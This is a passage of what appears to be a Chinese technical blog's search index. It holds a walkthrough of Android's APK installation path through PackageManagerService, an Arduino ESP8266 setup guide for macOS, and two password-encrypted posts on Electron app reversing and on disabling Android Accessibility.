apk文件完成安装（建立各安装包的配置结构信息，并添加到全局列表中进行管理） 创建了 PackageHandler 对象并建立消息循环，接收外部的安装请求 解析权限，建立底层 Linux Kernel 的用户机制和虚拟机层权限机制之间的映射 详细说明各项： Installer 是 PackageManagerService 的一个内部类，继承自SystemService，协助完成安装过程，主要是进行 apk 格式转换和数据目录建立，封装对文件和路径操作，真正的安装工作交由 IInstalld 内部类对象完成。 Installer 在 SystemServer 中启动，通过 SystemServiceManager 的 startService(Installer.class) 启动。 构造函数 Installer() 初始化 context 和 isolated（是否真正连接installd）成员变量 重写 onStart() 方法，基于 isolated 判断是否调用 connect() 进行连接 connect() 通过 ServiceManager 获取 installd 服务并拿到服务的本地代理放到成员变量 mInstalld 中 Installer 调用 dexopt() 最终调用了 mInstalld 的dexopt() 方法，其他方法类似，几乎就是一个 IInstalld 类的封装 !!!! Installer 的实现变化很大：6.0 上通过以命令的方式通过 execute 方法执行；8.1 通过 AIDL 接口实现 PackageManageService（system权限） 与 installd（root权限） 守护进程共同完成应用管理 PackageManagerService 的构造函数中会扫描许多应用目录来安装 apk 包括： 系统应用，目录有 /vender/overlay、/system/framework、/system/priv-app、/system/app、/vendor/app、/oem/app 非系统应用，目录有 /data/app、/data/app-private 调用的方法是 scanDirTracedLI() 可以看到依次调用 scanDirLI()、scanPackageLI()、scanPackageInternalLI() 其中，scanDirLI() 调用了 ParallelPackageParser 类进行解析，从名字也能看出做了一些并行的优化处理，真正的工作还是交给 PackageParser 来完成，PackageParser 的 parsePackage() 方法内部完成了应用的解析，实际上是解析了 AndroidManifest.xml 文件里面各个标签，包括包名、版本、权限、各组件这些信息，最后的解析结果放在 PackageParser.Package 类中返回给 PMS，这样 PMS 就拥有应用的信息便与做各种管理 后面继续调用了 scanPackageLI() 和 scanPackageInternalLI() 是进一步检测应用是否需要更新，如果需要更新则接着调用 createInstallArgsForExisting() 构造安装参数开始安装（后面还会遇到这个函数，暂时不展开），安装涉及到的签名校验也是在这里，调用了 collectCertificatesLI()、compareSignatures() 等 场景二：adb 命令安装adb 是 Android SDK 提供的一个命令行工具，为客户端-服务器架构，服务端为移动端上运行的守护进程 adbd，与 installd 一样由 init 进程创建 源码路径为：http://androidxref.com/8.1.0_r33/xref/system/core/adb/ adb_commandline() 函数接收 adb 命令行参数，调用 install_app() 执行安装流程，这个函数会对命令行做一些修改，实际上调用 pm 命令，并通过 send_shell_command() 将命令发送给 Pm 类。 Pm 启动函数 main 会构造 Pm 类对象并调用 run() 方法，在这个方法里首先会获取 PackageManger 服务 mPm，然后调用 getPackageInstaller() 获取 PackageInstaller 对象 mInstaller，最后基于不同的命令调用不同的方法。 runInstall() 里面会首先获取之前解析时设置的安装参数 InstallParams，然后依次调用 doCreateSession() 创建安装会话，doWriteSession() 会通过 IO 流将应用信息写入 PackageInstaller.Session 对象，doCommitSession() 会提交相应的会话启动安装，最后调用 abandonSession() 结束会话。 PackageInstallerSession 的 commit() 方法首先将包信息封装到 PackageInstallObserverAdapter 这个类中，是 PackageInstallerService 的一个内部类，然后通过这个适配器获取 PackageInstallObserver2 对象代理，这是一个跨进程的观察者，接收安装状态的回调，最后用 Handler 的 obtainMessage 构造一个 MSG_COMMIT 类型的消息并发送出去。 发送的消息由 PackageInstallerService 的 Handler.Callback 接受，然后调用 commitLocked()，此方法最终会调用 PMS 的 installStage() 方法。 PackageInstallObserver2 对象接收到安装成功的回调时，会接着调用 PackageInstallerService 的 dispatchSessionFinished()，这个方法最后也是到了 PMS 里面调用 sendSessionCommitBroadcast() 方法。 场景三：第三方应用安装当下载一个新的应用包双击安装时，实际上是发送了一个 “android.intent.action.INSTALL_PACKAGE” 的 intent，这个时候会唤起 Android 系统的一个应用 PackageInstaller 来完成安装操作 PackageInstaller 的应用代码位于：http://androidxref.com/8.1.0_r33/xref/packages/apps/PackageInstaller/ 安装位置 /system/priv-app/GooglePackageInstaller，是一个 Android 系统默认应用程序，提供了用户界面来管理应用或包，用于安装普通文件 应用双击安装后会唤起 PackageInstaller 应用，入口类为 InstallStart，onCreate() 首先被调用完成一些初始化过程，然后获取调用源做一些权限检查。 然后会调起 PackageInstallerActivity，onCreate() 会包括获取 PackageManager 和 PackageInstaller 对象，然后从 intent 中获取 mSessionId、packageUri、mOriginatingURI、mReferrerURI 这些与安装包相关的信息，接着调用 processPackageUri() 解析 uri，这里面会调用 PackageParser 去解析包，再接着会调用 bindUi() 完成安装主界面的展示和部件绑定，最后调用 checkIfAllowedAndInitiateInstall() 检查是否允许安装，如果允许，里面会继续调用 initiateInstall() 初始化安装，实际上这个函数是检查是否需要替换安装，最后调用 startInstallConfirm() 准备安装，设置 mOk 这个安装按钮为 true。 用户确认点击安装按钮后，调用 startInstall() 开始安装，这个函数里面又会构造一个 intent 传递必要的数据，开启 InstallInstalling 这个 activity。 InstallInstalling 这个类会拿到应用数据开启真正的安装流程。 首先是 onCreate() 函数，首先从 Intent 中取出数据放到 ApplicationInfo 中，然后基于拿到的应用信息分两种情况：如果是更新，则调用 getPackageManager() 获取 PackageManager 然后调用 installExistingPackage() 安装，成功调用 launchSuccess() 方法，失败调用 launchFailure() 方法，launchSuccess 会构造 Intent 跳转到 InstallSuccess 类， launchFailure 则跳转到 InstallFailed 类；如果是新应用的安装，首先会向 InstallEventReceiver 注册一个安装结果监听的广播，成功调用 launchSuccess，失败调用 launchFailure。 接下来是 onStart() 方法，这里会依次调用 getPackageManager()，getPackageInstaller()，registerSessionCallback() 注册会话的回调。 最后是 onResume() 方法，这个方法里会获取 session 的相关信息，然后创建并执行 InstallingAsyncTask() 的安装服务，其中的 doInBackground() 方法会将应用信息通过 IO 流写入 PackageInstaller.Session 中，onPostExecute() 方法则构造一个 PendingIntent 并将它的 IntentSender 通过 PackageInstaller.Session 的 commit() 方法发送出去 这里就跟 adb 安装走到了同一个流程中。 深入 PMS 中的安装上面的后面两种场景最后都会通过 PackageInstallerSession 的 commit() 方法提交一个安装的会话，并且最终调用到了 PackageManagerService 的 installStage() 方法 在 installStage() 里会基于传入的参数构造一个 InstallParams 对象，这个对象中包含安装包的所有数据，然后将这个对象作为消息内容，通过 mHandler 发送一个类型为 INIT_COPY 的消息。 所有类型的消息处理都在 PackageHandler 里，这个类会通过 Binder 与 system_server 创建的 ServiceThread 线程绑定，PackageHandler 负责分发任务，ServiceThread 负责处理任务。 1、处理 INIT_COPY 消息 首先从消息结构中取出前面封装好的 HandlerParams 对象，然后检查 mBound 标志判断是否绑定 DefaultContainerService，这个服务用于检查和复制文件，位于 com.android.defcontainer 进程，通过 IMediaContainerService 与PMS 通信，mBound 默认为 false，此时调用 connectToService() 来绑定服务，并获取当前索引值的 HandlerParams 对象添加到 mPendingInstalls 这个 HandlerParams 的 ArrayList 中，如果 mBound 为 true，即服务已经连接，则直接添加 HandlerParams 对象，并发送一个 MCS_BOUND 消息。 2、处理 MCS_BOUND 消息 首先检查 DefaultContainerService 服务连接没问题，就开始处理安装请求队列，从 mPendingInstalls 中取出 HandlerParams 对象并调用它的 startCopy() 方法。 HandlerParams 是 PMS 中的抽象类，它的 startCopy() 会通过一个 mRetries 的私有变量检查尝试次数，超过4次则向 Handler 发送 MCS_GIVE_UP 的消息，抓到异常则发送 MCS_RECONNECT 的消息，成功则继续调用 handleStartCopy() 这个抽象方法，具体实现在 InstallParams 中， InstallParams 的 handleStartCopy() 会首先是确定应用安装位置，是sd卡还是内部存储，并且做一些检查如位置冲突，空间够不够，然后通过 createInstallArgs() 创建 InstallArgs 类，然后调用这个类的 copyApk() 方法，InstallArgs 类也是抽象类，定义了应用包安装逻辑，子类包括 FileInstallArgs，处理 non-ASEC 应用，也即内部存储空间的应用， AsecInstallArgs 处理安装到 SD 卡中的应用，以及 MoveInstallArgs 处理已安装的应用，因此实际上是调用各自实例对象的 copyApk() 方法 以 FileInstallArgs 为例，copyApk() 方法会调用 doCopyApk()，在这个方法里会首先创建一个临时存储目录，然后调用 DefaultContainerService 的 copyPackage() 方法完成 apk 复制 HandlerParams 复制 apk 后会调用 handleReturnCode()，这个方法又会调用 processPendingInstall() 方法，最终会调用到 InstallArgs 的 doPreInstall() 完成安装前的清理工作，调用 installPackageTracedLI() 实现真正的安装，以及调用 InstallArgs 的 doPostInstall() 完成收尾的清理工作，最后发送一个类型为 POST_INSTALL 的消息 installPackageTracedLI() 里面完成的是真正的安装操作，会依次进行变量初始化，再次解析应用包，获取签名信息，权限检查，安装路径重命名等等操作，最后根据参数有两种不同的处理方式，更新条件下的覆盖安装，调用 replacePackageLI() 方法，以及应用的首次安装，调用 installNewPackageLI() 方法 其中 replacePackageLI() 会首先清楚应用包的注册信息，然后类似 installNewPackageLI() 里面的流程重新安装更新的包，直接看 installNewPackageLI() 流程 installNewPackageLI() 里面调用 scanPackageTraceLI() 执行安装，然后这个函数里面又会继续调用 scanPackageInternalLI() 执行包解析，最后将 PackageParser.Package 对象返回出来，扫描完包之后就会调用 updateSettingsLI() 更新 Settings，也就是更新应用在 PMS 中的注册信息，会修改包括 packages.xml、package.list 等相关文件，如果安装成功则调用 prepareAppDataAfterInstallLIF() 来创建相关的数据目录，失败则执行回退操作 deletePackageLIF() 3、处理 POST_INSTALL 消息 首先从 mRunningInstalls 中拿到 PostInstallData 对象，mRunningInstalls 是 PostInstallData 格式的列表，在应用安装成功时构建，在安装完成后会调用 delete() 移除这一条记录，接下来取 PostInstallData 对象中的一些信息如安装参数，授予的权限等作为参数调用 handlePackagePostInstall() 执行安装完成的后续操作，包括授予权限，发送安装成功广播，发送启动广播等等 安装过程小结与应用相关的一些目录 /system/priv-app：系统应用安装路径，Android 4.4+ 开始出现，区分系统应用权限，拥有 SignatureOrSystem 权限，此目录下的 service 具有保活能力 /system/app：系统应用安装路径，权限略低于 priv-app 目录下的应用，放置比如厂商内置应用 /data/app：用户应用安装路径，应用安装时将 apk 复制到此目录下 /data/data：用户应用数据存放路径，存在沙箱隔离 /data/dalvik-cache：存放应用的dex 文件 /data/system：存放应用安装相关文件 packages.xml 是一个应用的注册表，在解析应用时创建，有变化时更新，记录系统权限，各应用信息，如name, codePath, flag, version, userid，下次开机时直接读取并添加到内存列表 package.list 指定应用的默认存储位置，userid 等 应用安装过程总结 将应用 apk 拷贝到指定目录下 解压 apk，将 dex 文件拷贝到 /data/dalvik-cache 目录，创建 /data/data/ 数据目录 解析 AndroidManifest.xml 及其他资源文件，提取应用包信息，注册到 packags.xml 中 由 Launcher 进程通过 PMS 取出所有应用程序，展示在桌面上 PMS 与 PM 与APM前面的一切分析都是围绕 PackageManagerService 来进行的，但是实际上平时开发过程中基本接触不到这个类，在用户层用得最多的应该是 PackageManager 这个类 通常在用户层通过 Context 的 getPackageManager() 方法来获取 PackageManager 实例，Context 的 getPackageManager() 实现在 ContextImpl 里面，这个函数实际上返回的是一个 ApplicationPackageManager 对象，ApplicationPackageManager 类构造函数需要两个璨是，一个是 ContextImpl 自身，另一个是通过 ActivityThread 的 getPackageManager() 获取 IPackageManager 对象 ActivityThread 的 getPackageManager() 首先调用 ServiceManager 的 getService(“package”) 获取 IBinder 对象，然后通过 IPackageManger.Stub.asInterface(IBinder) 获取 IPackageManager 对象，实际上为这个对象的一个代理 继续梳理一下这个类与 PMS 之间的关系 IPackageManager 使用了 Android 接口定义语言（AIDL）实现进程间通信，通过在 .aidl 后缀的文件中定义好接口，Android SDK 就会基于此文件自动生成一个 IBinder 接口的类，服务端实现这些接口，客户端则通过绑定到服务调用接口中定义的方法 IPackageManager 通过 AIDL 文件自动生成的一个接口类，继承自 IInterface IPackageManager.Stub 是 IPackageManager 的内部类，继承自 Binder，实现 IPackageManager asInterface() 方法接受 IBinder 对象，转换成 IPackageManager 类型对象并返回，实际上返回的是 IPackageManager.Stub.Proxy 对象 asBinder() 方法返回自身，即 IPackageManager.Stub 对象 重写了 onTransact() 方法，根据命令类型处理数据传输 IPackageManager.Stub.Proxy 是 IPackageManager.Stub 的内部类，实现了IPackageManager接口 mRemote对象是IBinder类型，是对IPackageManager.Stub的引用 重写了asBinder()方法，返回mRemote 实现了AIDL文件定义的接口 PackageManager 是系统提供的服务管理类，负责管理应用程序包的，包含以下功能： 安装/卸载/更新应用，包括 installPackage/ 查询已安装应用，通过 getInstalledPackages() 方法获取 PackageInfo 对象的列表 查询应用相关信息，通过 getPackageInfo() 方法获取 PackageInfo 对象 查询权限相关信息，通过 getPermissionInfo() 方法获取 PermissionInfo 对象 增加/删除权限，包括 addPermission/removePermission 清除用户数据/缓存/代码等 PackageManager 是一个抽象类，定义了 IPackageManager 接口的子集 ApplicationPackageManager 是 PackageManager 的实现类，它继承了 PackageManager 并实现其所有抽象方法 PackageManagerService 继承了 IPackageManager.Stub 因此，总结来说就是，ApplicationPackageManager 是 AIDL 模型中 Binder 通信的客户端，PackageMangerService 就是服务端，客户端的所有的功能都是通过一个 IPackageManager 类型的成员变量去完成的，实际上这个变量就是 PackageManagerService 的一个代理，通过这个代理客户端可以调用到 PackageManagerService 中的一些方法 参考 http://androidxref.com/8.1.0_r33/xref/ https://juejin.im/post/5b7e72bbe51d453894001ef0#heading-6 http://solart.cc/2016/10/30/install_apk/ https://www.jianshu.com/p/4f16421d5c7f","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"Android","slug":"Android","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"}]},{"title":"Arduino ESP8266开发板上手实践","date":"2019-07-30T02:46:35.000Z","path":"2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/","text":"Arduino ESP8266开发板上手实践环境搭建（macOS）官方说明：https://github.com/esp8266/Arduino 安装IDE （Arduino IDE） 下载地址：https://www.arduino.cc/en/main/software 还有种方式是利用Makefile去做开发，这里先做个记录，说不定以后会用这个开发模式，毕竟可控性比较高。但目前还不是很熟悉，建议选择上面的IDE。 下载ESP8266硬件包 1 、在设置里面的附加板管理器网址中增加以下链接https://arduino.esp8266.com/stable/package_esp8266com_index.json 2、在工具中找到你的开发板，然后进入开发板管理器，搜索esp8266安装该库，我这里已经安装了。 注意：如果这种方式安装不了，你可以选择下载软件包手动安装，这里不展开分析。参考这里 运行示例代码 我这里打开Blink这个示例代码，这段代码很简单，就是控制LED灯的闪烁。 代码如下 /* ESP8266 Blink by Simon Peter Blink the blue LED on the ESP-01 module This example code is in the public domain The blue LED on the ESP-01 module is connected to GPIO1 (which is also the TXD pin; so we cannot use Serial.print() at the same time) Note that this sketch uses LED_BUILTIN to find the pin with the internal LED */ void setup() { pinMode(LED_BUILTIN, OUTPUT); // Initialize the LED_BUILTIN pin as an output } // the loop function runs over and over again forever void loop() { digitalWrite(LED_BUILTIN, LOW); // Turn the LED on (Note that LOW is the voltage level // but actually the LED is on; this is because // it is active low on the ESP-01) delay(1000); // Wait for a second digitalWrite(LED_BUILTIN, HIGH); // Turn the LED off by making the voltage HIGH delay(2000); // Wait for two seconds (to demonstrate the active low LED) } 在这里点击项目上传，就会编译该Blink项目并上传写入开发板上面运行。如果一切顺利的话，你的开发板的LED灯应该就会开始闪烁了。 重要！！！一些坑以及注意点下面说下一切不是很顺利的情况，首先我这里是以mac会开发平台，所以这里都是mac相关的注意事项和问题。 确定你的端口正常，即电脑是否与开发板正常通信。一般来说你上传代码报错多半是由于端口不可用或者无法找到端口。这里提供几个思路去检查。 1、确定usb是否连接，这里可以下载一个IORegistryExplorer的工具。下载地址1 下载地址2 下载地址3在我插入开发板的时候可以看到usb2.0下面多了一个设备，说明能够usb连接正常。 2、确定安装了开发板相关的驱动，这个驱动的作用主要就是将设备操作通过Virtual COM Port去通信。这里有几个坑。之前网上能搜到的驱动都不支持最新的macOS系统（10.14）。所以导致我的/dev目录下并没有出现对应的文件。之前的驱动大多是这个CH340G CH34G CH34X Mac OS X driver 照着里面的步骤，把SIP禁用以及其他都操作了一遍都不行。最后才发现这个驱动可能不支持最新的mac系统，这里我找到一个能够在最新系统正常的驱动下载地址在这里。安装完以后在/dev就应该有一个tty.SLAB_USBtoUART的文件。说明通信的端口已经建立，这时候再IDE中选择该端口。 资源链接这里我提供一些我在搭建过程中搜到的一些资源，可以参考一下 https://www.arduino.cc/en/guide/macOSX?setlang=cn 在Mac OS X系统上入门Arduino/ Genuino https://juejin.im/post/5b569026e51d4513ee6dd509 Esp8266+Arduino+Mac开发环境搭建 https://www.open-homeautomation.com/2016/06/10/program-an-esp8266-from-arduino-on-macos/ Program an ESP8266 from Arduino on MacOS https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver CH340G CH34G CH34X Mac OS X driver http://www.nodemcu.com 资料下载访问官网 https://pan.baidu.com/s/1ZCjaSJLNpQWL7CPOpkH-dg NODEMCU资料 http://www.wch.cn/download/CH341SER_MAC_ZIP.html mac串口驱动下载地址 https://freeware.the-meiers.org/ CoolTerm串口监控工具下载 SIP禁用步骤 1. 重启mac，在出现苹果标志和进度条的时候按住 cmd+r 2. 终端中输入csrutil disable/status/enabled 3. 重启mac AVR逆向基础下面我们就来熟悉一下这个系统，包括代码环境，编译环境，常见库，开发相关。还是以一些demo代码作为学习。 由于我们主要是研究iOT逆向，所以可能不会关注在实际开发上面。这里先学习下Arduino上面的执行文件格式，以及指令架构等。 我们通常说的Arduino上面就运行的是一个AVR指令架构的处理器。 AVR refers to the line of MCUs manufactured by Atmel and used in the original designs. 由于ida对这个执行文件的支持不是很好，我们准备用radare2来分析这个bin文件。 参考 https://blog.csdn.net/iotisan/article/details/78766463 和ESP8266 Arduino谈场恋爱 01 一条具有中国特色的开发环境安装道路 https://www.reddit.com/r/arduino/comments/9jlz5g/any_nodemcu_esp8266_drivers_for_macos_mojave/ Any NodeMCU esp8266 Drivers for MacOS Mojave?","tags":[{"name":"Arduino","slug":"Arduino","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Arduino/"},{"name":"IOT","slug":"IOT","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/IOT/"}]},{"title":"Electron跨平台App实战分析","date":"2019-07-29T03:59:49.000Z","path":"2019/07/29/Electron-app-reversing/Electron-app-reversing/","text":"Need password to decrypt! Incorrect Password! No content to display! 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","tags":[{"name":"Electron","slug":"Electron","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Electron/"},{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"}]},{"title":"Android完全禁用Accessibility（通杀一切基于此的外挂）","date":"2019-07-24T12:02:54.000Z","path":"2019/07/24/android-disableAccessibility/android-disableAccessibility/","text":"Need password to decrypt! Incorrect Password! No content to display! 